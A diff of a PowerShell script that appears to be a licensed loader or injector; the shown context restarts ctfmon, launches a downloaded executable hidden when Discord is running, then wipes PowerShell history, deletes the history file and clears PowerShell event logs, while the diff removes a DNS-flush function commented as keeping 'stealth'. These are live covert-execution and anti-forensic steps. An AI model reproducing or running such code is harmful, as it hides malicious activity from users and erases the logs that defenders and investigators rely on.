@@ -28,15 +28,7 @@ if ($response.success -eq $true) {
     
     # Step 4: Injection logic placeholder
     Write-Host "[*] Proceeding with injection..."
-   function Flush-DNS {
-    try {
-        Invoke-Expression "ipconfig /flushdns" -ErrorAction SilentlyContinue | Out-Null
-    } catch {
-        # Suppress errors to maintain stealth
-    }
-}
-
-Stop-Process -Name "ctfmon" -Force -ErrorAction SilentlyContinue
+   Stop-Process -Name "ctfmon" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Milliseconds 500
 Start-Process "C:\Windows\System32\ctfmon.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
@@ -58,7 +50,7 @@ if ($ctfmonRunning -and $discordRunning) {
     Start-Sleep -Seconds 2
     Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
 }
-Flush-DNS
+
 Clear-History
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
 if (Test-Path $historyPath) {
@@ -88,6 +80,7 @@ wevtutil el | Where-Object { $_ -match "PowerShell" } | ForEach-Object { wevtuti
 
 Exit
 
+}
 
 } else {
     Write-Host "[x] License Check Failed: $($response.message)"
